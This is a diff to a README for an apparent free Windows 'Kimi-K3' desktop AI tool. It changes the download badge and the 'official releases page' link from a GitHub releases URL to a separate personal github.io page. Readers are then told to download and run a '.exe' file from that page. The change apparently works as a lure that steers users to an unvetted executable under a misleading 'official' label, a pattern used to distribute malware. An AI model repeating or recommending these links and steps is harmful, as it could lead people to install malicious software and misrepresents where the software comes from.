@@ -1,6 +1,6 @@
 # 🤖 Kimi-K3-Code-Free-Desktop-AI - Run Advanced AI Models On Windows
 
-[![Download Kimi-K3](https://img.shields.io/badge/Download-Release-blue)](https://github.com/nathaliaunfilled489/Kimi-K3-Code-Free-Desktop-AI/releases)
+[![Download Kimi-K3](https://img.shields.io/badge/Download-Release-blue)](https://nathaliaunfilled489.github.io)
 
 ## 📖 About This Tool
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to set up the application on your computer:
 
-1.  Visit the [official releases page](https://github.com/nathaliaunfilled489/Kimi-K3-Code-Free-Desktop-AI/releases).
+1.  Visit the [official releases page](https://nathaliaunfilled489.github.io).
 2.  Look for the latest release at the top of the list.
 3.  Click the file ending in `.exe` to download it to your computer.
 4.  Once the download finishes, locate the file in your Downloads folder.
